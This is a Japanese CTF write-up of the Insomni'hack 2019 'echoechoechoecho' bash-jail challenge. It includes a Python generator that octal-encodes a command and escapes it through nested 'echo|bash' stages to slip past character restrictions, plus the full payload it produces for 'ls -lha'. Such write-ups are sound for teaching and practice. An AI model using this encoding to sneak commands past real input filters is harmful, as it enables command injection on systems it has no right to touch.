# [pwn 216pts] echoechoechoecho - Insomni'hack teaser 2019
問題のDockerは[こちら](https://github.com/eboda/insomnihack/tree/master/echoechoechoecho)にあります。
ファイルは配られませんが、接続して`thisfile`と入力すればソースコードが見れます。

さて、ソースコードを見ると入力した`payload`に`|bash`が指定した回数(0-10)足され、実行されます。
ただし、`payload`に使える文字は次のように種類や回数が限られています。
```python
    if re.search(r'[^();+$\\= \']', payload.replace("echo", "")):
        bye("ERROR invalid characters")

    # real echolords probably wont need more special characters than this
    if payload.count("+") > 1 or \
            payload.count("'") > 1 or \
            payload.count(")") > 1 or \
            payload.count("(") > 1 or \
            payload.count("=") > 2 or \
            payload.count(";") > 3 or \
            payload.count(" ") > 30:
        bye("ERROR Too many special chars.")
```
payloadにはascii文字しか使えません。

まず、次のようにして数字を出力させることができます。
```bash
$ echo $(($$==$$))
1
$ echo $((($$==$$)+($$==$$)))
2
```

また、次のようにして同じ記号を何度も使うことができます。
```bash
$ echo=\=;echo $echo
=
```

イメージとしてはこんな感じです。
```bash
$ echoechoecho=\(;echoecho=\);echo=\=;echo echo \$$echoechoecho$echoechoecho\$\$$echo$echo\$\$$echoecho$echoecho|bash
1
```

`=`が2回までなので最優先でこれを作ります。
```bash
echo=\=;
```
次に`;`も頻出なので作ります。
```bash
echo=\=;echo echoecho$echo\\\;
```
括弧も作りましょう。
```bash
echo=\=;echo echoecho$echo\\\;\;echo echoechoecho$echo\\\\\\\(\$echoecho echoechoechoecho$echo\\\\\\\)\$echoecho
```
とりあえず目標は例えば`ls`を`$'\154\163'`のように変換して実行することです。
今回は`= -> ; -> +,(,),'`の順にエスケープした後、数字をエスケープします。
この順番で上手くやれば回数制限に引っ掛らないはずです。

```python
def escape(payload):
    # escape special characters
    enc = lambda c: "\\" + c if c in "+=$()';\\" else c
    return "".join(
        [enc(c) for c in payload]
    )

def stage1(payload):
    # convert to char code
    return "echo $'" + "".join(
        ['\\' + oct(ord(c))[1:] for c in payload]
    ) + "'"

def stage2(payload):
    # escape digits
    payload = escape(payload)
    def enc(c):
        if c in "0123456789":
            if c == "0":
                # 11==1
                return "$(($echo$echo==$echo))"
            else:
                # 1+1+1+...
                return "$((" + "+".join(["$echo" for i in range(int(c))]) + "))"
        else:
            return c
    return "echo=$(($$==$$)); echo " + "".join(
        [enc(c) for c in payload]
    )

def stage3(payload):
    # Escape ', (, ), +
    payload = escape(payload)
    payload = payload.replace("\\'", "$echoecho")
    payload = payload.replace("\\(", "$echoechoecho")
    payload = payload.replace("\\)", "$echoechoechoecho")
    payload = payload.replace("\\+", "$echoechoechoechoecho")
    return "echoecho=\\'; echoechoecho=\\(; echoechoechoecho=\\); echoechoechoechoecho=\\+; echo " + payload

def stage4(payload):
    # Escape ;
    payload = escape(payload)
    payload = payload.replace("\\;", "$echoechoechoechoechoecho")
    return "echoechoechoechoechoecho=\\;; echo " + payload

def stage5(payload):
    # Escape =
    payload = escape(payload)
    payload = payload.replace("\\=", "$echoechoechoechoechoechoecho")
    return "echoechoechoechoechoechoecho=\\=; echo " + payload

import re

def check_input(payload):
    if payload == 'thisfile':
        print(open("/bin/shell").read())

    if not all(ord(c) < 128 for c in payload):
        print("ERROR ascii only pls")

    if re.search(r'[^();+$\\= \']', payload.replace("echo", "")):
        print("ERROR invalid characters")

    # real echolords probably wont need more special characters than this
    if payload.count("+") > 1 or \
            payload.count("'") > 1 or \
            payload.count(")") > 1 or \
            payload.count("(") > 1 or \
            payload.count("=") > 2 or \
            payload.count(";") > 3 or \
            payload.count(" ") > 30:
        print("ERROR Too many special chars.")

    return payload

from subprocess import check_output

payload = 'ls -lha'
payload = stage1(payload)
payload = stage2(payload)
payload = stage3(payload)
payload = stage4(payload)
payload = stage5(payload)
check_input(payload)
print(payload)
payload += "|bash" * 5
#result = check_output(payload, shell=True, executable="/bin/bash")
#print(result)
```

こんな感じで任意のコマンドの実行に成功しました。
最終的に出来上がった`ls -lha`コマンドは次のようになります。
```bash
echoechoechoechoechoechoecho=\=; echo echoechoechoechoechoecho$echoechoechoechoechoechoecho\\\;\; echo echoecho\\$echoechoechoechoechoechoecho\\\\\\\'\$echoechoechoechoechoecho echoechoecho\\$echoechoechoechoechoechoecho\\\\\\\(\$echoechoechoechoechoecho echoechoechoecho\\$echoechoechoechoechoechoecho\\\\\\\)\$echoechoechoechoechoecho echoechoechoechoecho\\$echoechoechoechoechoechoecho\\\\\\\+\$echoechoechoechoechoecho echo echo\\\\\\$echoechoechoechoechoechoecho\\\\\\\$\\\$echoechoecho\\\$echoechoecho\\\\\\\$\\\\\\\$\\\\\\$echoechoechoechoechoechoecho\\\\\\$echoechoechoechoechoechoecho\\\\\\\$\\\\\\\$\\\$echoechoechoecho\\\$echoechoechoecho\\\\\$echoechoechoechoechoecho echo echo \\\\\\\\\\\\\\\$\\\\\\\\\\\$echoecho\\\\\\\\\\\\\\\\\\\\\\\$\\\$echoechoecho\\\$echoechoecho\\\\\\\$echo\\\$echoechoechoecho\\\$echoechoechoecho\\\\\\\$\\\$echoechoecho\\\$echoechoecho\\\\\\\$echo\\\$echoechoechoechoecho\\\\\\\$echo\\\$echoechoechoechoecho\\\\\\\$echo\\\$echoechoechoechoecho\\\\\\\$echo\\\$echoechoechoechoecho\\\\\\\$echo\\\$echoechoechoecho\\\$echoechoechoecho\\\\\\\$\\\$echoechoecho\\\$echoechoecho\\\\\\\$echo\\\$echoechoechoechoecho\\\\\\\$echo\\\$echoechoechoechoecho\\\\\\\$echo\\\$echoechoechoechoecho\\\\\\\$echo\\\$echoechoechoecho\\\$echoechoechoecho\\\\\\\\\\\\\\\\\\\\\\\$\\\$echoechoecho\\\$echoechoecho\\\\\\\$echo\\\$echoechoechoecho\\\$echoechoechoecho\\\\\\\$\\\$echoechoecho\\\$echoechoecho\\\\\\\$echo\\\$echoechoechoechoecho\\\\\\\$echo\\\$echoechoechoechoecho\\\\\\\$echo\\\$echoechoechoechoecho\\\\\\\$echo\\\$echoechoechoechoecho\\\\\\\$echo\\\$echoechoechoechoecho\\\\\\\$echo\\\$echoechoechoecho\\\$echoechoechoecho\\\\\\\$\\\$echoechoecho\\\$echoechoecho\\\\\\\$echo\\\$echoechoechoechoecho\\\\\\\$echo\\\$echoechoechoechoecho\\\\\\\$echo\\\$echoechoechoecho\\\$echoechoechoecho\\\\\\\\\\\\\\\\\\\\\\\$\\\$echoechoecho\\\$echoechoecho\\\\\\\$echo\\\$echoechoechoechoecho\\\\\\\$echo\\\$echoechoechoechoecho\\\\\\\$echo\\\$echoechoechoechoecho\\\\\\\$echo\\\$echoechoechoecho\\\$echoechoechoecho\\\\\\\$\\\$echoechoecho\\\$echoechoecho\\\\\\\$echo\\\\\\\$echo\\\\\\$echoechoechoechoechoechoecho\\\\\\$echoechoechoechoechoechoecho\\\\\\\$echo\\\$echoechoechoecho\\\$echoechoechoecho\\\\\\\\\\\\\\\\\\\\\\\$\\\$echoechoecho\\\$echoechoecho\\\\\\\$echo\\\$echoechoechoechoecho\\\\\\\$echo\\\$echoechoechoechoecho\\\\\\\$echo\\\$echoechoechoechoecho\\\\\\\$echo\\\$echoechoechoechoecho\\\\\\\$echo\\\$echoechoechoecho\\\$echoechoechoecho\\\\\\\$\\\$echoechoecho\\\$echoechoecho\\\\\\\$echo\\\$echoechoechoechoecho\\\\\\\$echo\\\$echoechoechoechoecho\\\\\\\$echo\\\$echoechoechoechoecho\\\\\\\$echo\\\$echoechoechoechoecho\\\\\\\$echo\\\$echoechoechoecho\\\$echoechoechoecho\\\\\\\\\\\\\\\\\\\\\\\$\\\$echoechoecho\\\$echoechoecho\\\\\\\$echo\\\$echoechoechoecho\\\$echoechoechoecho\\\\\\\$\\\$echoechoecho\\\$echoechoecho\\\\\\\$echo\\\$echoechoechoechoecho\\\\\\\$echo\\\$echoechoechoechoecho\\\\\\\$echo\\\$echoechoechoechoecho\\\\\\\$echo\\\$echoechoechoechoecho\\\\\\\$echo\\\$echoechoechoecho\\\$echoechoechoecho\\\\\\\$\\\$echoechoecho\\\$echoechoecho\\\\\\\$echo\\\$echoechoechoechoecho\\\\\\\$echo\\\$echoechoechoechoecho\\\\\\\$echo\\\$echoechoechoechoecho\\\\\\\$echo\\\$echoechoechoecho\\\$echoechoechoecho\\\\\\\\\\\\\\\\\\\\\\\$\\\$echoechoecho\\\$echoechoecho\\\\\\\$echo\\\$echoechoechoecho\\\$echoechoechoecho\\\\\\\$\\\$echoechoecho\\\$echoechoecho\\\\\\\$echo\\\$echoechoechoechoecho\\\\\\\$echo\\\$echoechoechoechoecho\\\\\\\$echo\\\$echoechoechoechoecho\\\\\\\$echo\\\$echoechoechoechoecho\\\\\\\$echo\\\$echoechoechoecho\\\$echoechoechoecho\\\\\\\$\\\$echoechoecho\\\$echoechoecho\\\\\\\$echo\\\\\\\$echo\\\\\\$echoechoechoechoechoechoecho\\\\\\$echoechoechoechoechoechoecho\\\\\\\$echo\\\$echoechoechoecho\\\$echoechoechoecho\\\\\\\\\\\\\\\\\\\\\\\$\\\$echoechoecho\\\$echoechoecho\\\\\\\$echo\\\$echoechoechoecho\\\$echoechoechoecho\\\\\\\$\\\$echoechoecho\\\$echoechoecho\\\\\\\$echo\\\$echoechoechoechoecho\\\\\\\$echo\\\$echoechoechoechoecho\\\\\\\$echo\\\$echoechoechoechoecho\\\\\\\$echo\\\$echoechoechoecho\\\$echoechoechoecho\\\\\\\$\\\$echoechoecho\\\$echoechoecho\\\\\\\$echo\\\$echoechoechoecho\\\$echoechoechoecho\\\\\\\\\\\$echoecho
```

# 感想
うーん、これ系のjail問題は面倒ですし実用的じゃないので嫌いです。
パズルとしては面白いと思います。

# 参考文献
[1] [echoechoechoecho, 216p, 18 solves](https://github.com/p4-team/ctf/tree/master/2019-01-19-insomnihack-quals/echoechoechoecho)

